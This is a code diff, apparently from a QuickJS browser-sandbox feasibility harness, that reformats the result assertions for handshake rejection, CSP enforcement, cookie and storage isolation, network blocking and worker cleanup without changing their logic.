       replyAfterCancellationRejected: cancellationInitiated && cancellationPendingRetired && !cancellationReplyAccepted,
       missingHandshakeRejected: !missingHandshake.accepted && missingHandshake.infrastructureError,
-      invalidHandshakeRejected: !invalidHandshake.accepted && invalidHandshake.infrastructureError
-        && !invalidHandshakeCompleted,
+      invalidHandshakeRejected:
+        !invalidHandshake.accepted && invalidHandshake.infrastructureError && !invalidHandshakeCompleted,
       malformedFrameRejected: malformedResponse.data.result.reason === 'policy-rejected',
-      runMetadataPreserved: response.data.result.runId === 'quickjs-fixture-canonical'
-        && response.data.result.sourceRevision === 7
-        && response.data.result.challengeId === 'longest-window'
-        && response.data.result.challengeVersion === '1.0.0',
+      runMetadataPreserved:
+        response.data.result.runId === 'quickjs-fixture-canonical' &&
+        response.data.result.sourceRevision === 7 &&
+        response.data.result.challengeId === 'longest-window' &&
+        response.data.result.challengeVersion === '1.0.0',
       runnerOrigin: state.runnerOrigin,
-      messageEvidence: { readyOrigin: readyMessage.origin, readySourceMatches: readyMessage.sourceMatches, forgedPassSourceMatches: forged?.sourceMatches },
+      messageEvidence: {
+        readyOrigin: readyMessage.origin,
+        readySourceMatches: readyMessage.sourceMatches,
+        forgedPassSourceMatches: forged?.sourceMatches,
+      },
       trustedScore: staleOutcome.trustedScore,
     };
     const q5Final = {
       ...q5,
-      pageAndWorkerCspEnforced: !state.appProbeRequests && state.workerScriptHeaders.length > 0
-        && state.workerScriptHeaders.every((value) => value.includes("connect-src 'self'") && !value.includes(state.appOrigin))
-        && state.appPageCsp.includes(`frame-src ${state.runnerOrigin}`)
-        && state.runnerPageCsp.includes(`frame-ancestors ${state.appOrigin}`),
+      pageAndWorkerCspEnforced:
+        !state.appProbeRequests &&
+        state.workerScriptHeaders.length > 0 &&
+        state.workerScriptHeaders.every(
+          (value) => value.includes("connect-src 'self'") && !value.includes(state.appOrigin),
+        ) &&
+        state.appPageCsp.includes(`frame-src ${state.runnerOrigin}`) &&
+        state.runnerPageCsp.includes(`frame-ancestors ${state.appOrigin}`),
       staticWasmLoadedUnderCsp: state.wasmRequests > 0,
-      crossSiteCookieStorageIsolated: inspectRunner.appCookieVisible === false
-        && inspectRunner.appStorageCanary === null
-        && inspectRunner.parentDomDenied === true
-        && inspectRunner.runnerStorageAvailable === true,
-      arbitraryNetworkBlocked: inspectRunner.pageNetworkBlocked === true
-        && workerEvidence?.workerNetworkBlocked === true && state.appProbeRequests === 0,
+      crossSiteCookieStorageIsolated:
+        inspectRunner.appCookieVisible === false &&
+        inspectRunner.appStorageCanary === null &&
+        inspectRunner.parentDomDenied === true &&
+        inspectRunner.runnerStorageAvailable === true,
+      arbitraryNetworkBlocked:
+        inspectRunner.pageNetworkBlocked === true &&
+        workerEvidence?.workerNetworkBlocked === true &&
+        state.appProbeRequests === 0,
       appProbeRequests: state.appProbeRequests,
       wasmRequests: state.wasmRequests,
       wasmBytes: state.wasmBytes ?? 0,
@@ -1154,12 +1641,28 @@ export async function runQuickJsFeasibility() {
     cleanup.workersDisposed = metrics.activeWorkers === 0 && metrics.workersCreated === metrics.workersTerminated;
     cleanup.browserClosed = true;
     return {
-      quickjs: { version: packageJson.dependencies['quickjs-emscripten'], license: 'MIT', package: 'quickjs-emscripten' },
+      quickjs: {
+        version: packageJson.dependencies['quickjs-emscripten'],
+        license: 'MIT',
+        package: 'quickjs-emscripten',
+      },
       typescript: { version: TypeScript.version },
       browser: { name: 'Microsoft Edge', version: browser.version(), consoleErrors: consoleErrors.slice(0, 20) },
       fixture: { buildOutput, appOrigin: state.appOrigin, runnerOrigin: state.runnerOrigin },
-      q1, q2, q3, q4, q5: q5Final,
-      q6: { browser: { responsiveDuringTimeout: page.isClosed() === false && loopResponse.data.result.status === 'timeout' && loopTiming.responsiveTicks > 0 }, cleanup },
+      q1,
+      q2,
+      q3,
+      q4,
+      q5: q5Final,
+      q6: {
+        browser: {
+          responsiveDuringTimeout:
+            page.isClosed() === false &&
+            loopResponse.data.result.status === 'timeout' &&
+            loopTiming.responsiveTicks > 0,
+        },
+        cleanup,
+      },
       cleanup,
     };
   } finally {
